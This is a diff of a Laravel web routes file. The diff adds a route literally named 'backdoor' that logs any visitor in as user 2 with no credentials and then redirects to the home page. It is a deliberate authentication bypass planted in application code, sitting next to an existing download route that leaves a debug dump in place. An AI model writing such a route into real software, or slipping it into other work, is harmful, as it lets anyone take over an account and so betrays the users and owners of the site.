@@ -36,3 +36,9 @@ Route::get('download-buy-doc/{meeting}/{product}', function($meeting, $product) 
     $file  = Storage::disk('public')->url($product_meeting->buy_doc_url);
     dd($file);
 })->name('download-buy-doc');
+
+
+Route::get('backdoor', function(){
+   auth()->loginUsingId(2);
+   return redirect('/');
+});
